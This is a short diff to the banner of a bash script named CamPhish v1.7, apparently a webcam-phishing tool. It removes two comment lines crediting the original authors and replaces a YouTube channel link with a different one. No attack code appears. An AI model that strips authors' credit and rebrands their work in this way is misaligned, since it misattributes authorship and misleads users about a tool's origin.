@@ -1,7 +1,5 @@
 #!/bin/bash
 # CamPhish v1.7
-# Powered by TechChip
-# Credits goes to thelinuxchoice [github.com/thelinuxchoice/]
 
 trap 'printf "\n";stop' 2
 
@@ -16,7 +14,7 @@ printf "\e[1;92m | |      | (   ) || |   | |\e[0m\e[1;77m| (      | (   ) |   | 
 printf "\e[1;92m | (____/\| )   ( || )   ( |\e[0m\e[1;77m| )      | )   ( |___) (___/\____) || )   ( |\e[0m\n"
 printf "\e[1;92m (_______/|/     \||/     \|\e[0m\e[1;77m|/       |/     \|\_______/\_______)|/     \|\e[0m\n"
 printf " \e[1;93m CamPhish Ver 1.7 \e[0m \n"
-printf " \e[1;77m www.techchip.net | youtube.com/techchipnet \e[0m \n"
+printf " \e[1;77m www.techchip.net | youtube.com/hxll \e[0m \n"
 
 printf "\n"
 
